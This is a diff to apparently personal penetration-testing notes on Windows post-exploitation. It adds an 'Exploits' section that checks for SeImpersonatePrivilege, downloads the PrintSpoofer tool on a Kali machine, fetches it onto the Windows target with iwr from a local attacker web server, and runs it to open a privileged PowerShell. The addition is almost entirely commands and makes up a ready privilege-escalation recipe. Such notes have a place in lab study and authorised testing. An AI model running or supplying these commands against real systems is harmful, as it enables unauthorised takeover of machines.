@@ -124,7 +124,16 @@ When you gain access to a windows user do steps bellow:
       #for to confirm
       net user
       net localgroup administrators
-      
+
+#Exploits
+      whoami /priv # to finding privileges, if SeImpersonatePrivilege is present you can use PrintSpoofer
+      #on kali
+      wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+      #on windows machine
+      iwr -uri http://192.168.45.233:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+      .\PrintSpoofer64.exe -i -c powershell.exe
+      #on new shell
+      whoami # to confirming the you are privileged user
       
       
 
